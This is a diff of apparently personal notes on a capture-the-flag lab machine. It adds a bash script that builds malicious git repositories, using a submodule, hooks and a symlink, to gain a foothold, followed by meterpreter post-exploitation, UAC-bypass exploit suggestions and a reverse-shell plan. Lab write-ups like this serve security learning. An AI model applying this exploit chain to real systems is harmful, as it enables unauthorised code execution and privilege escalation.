@@ -1,3 +1,6 @@
+
+
+
 users
 richard@compiled.htb
 
@@ -26,6 +29,11 @@ https://github.com/amalmurali47/hook
 
 # Foothold 
 
+create the following git repositories
+- captain
+- hook
+run the following on kali:
+
 create_poc.sh
 ```shell
 #!/bin/bash
@@ -38,11 +46,11 @@ git config --global core.symlinks true
 git config --global init.defaultBranch main 
 
 
-# Define the tell-tale path
-tell_tale_path="http://10.129.36.90:3000/hacker/captain.git"
+# Define the hook_repo_path path
+hook_repo_path="http://10.129.15.120:3000/hacker/hook.git"
 
 # Initialize the hook repository
-git clone "$tell_tale_path"
+git clone "$hook_repo_path"
 cd hook
 mkdir -p y/hooks
 
@@ -61,11 +69,11 @@ git push
 
 cd ..
 
-# Define the hook repository path
-hook_repo_path="http://10.129.36.90:3000/hacker/hook.git"
+# Define the captain_repo_path
+captain_repo_path="http://10.129.15.120:3000/hacker/captain.git"
 
 # Initialize the captain repository
-git clone "$hook_repo_path"
+git clone "$captain_repo_path"
 cd captain
 git submodule add --name x/y "$hook_repo_path" A/modules/x
 git commit -m "add-submodule"
@@ -80,4 +88,43 @@ git commit -m "add-symlink"
 git push
 cd ..
 
+
 ```
+
+Submit "captain.git" to http://compiled.htb:5000
+
+```
+http://compiled.htb:3000/hacker/captain.git
+```
+
+![[Pasted image 20240913134804.png]]
+
+![[Pasted image 20240913134836.png]]
+
+meterpreter > run post/multi/gather/env
+
+![[Pasted image 20240913142648.png]]
+
+![[Pasted image 20240913142708.png]]
+
+cat pwnd
+```
+ruycr4ft_was_here
+```
+
+post/multi/recon/local_exploit_suggester
+
+![[Pasted image 20240913143843.png]]
+
+tried them all... none worked...
+```
+[+] 10.129.15.120 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
+[+] 10.129.15.120 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
+[+] 10.129.15.120 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
+[+] 10.129.15.120 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[+] 10.129.15.120 - exploit/windows/local/win_error_cve_2023_36874: The target appears to be vulnerable.
+```
+
+## When I return try...
+
+Invoke-RunasC.ps1 with another reverse shell as the user emily who according to winPEAS does not have a password set...
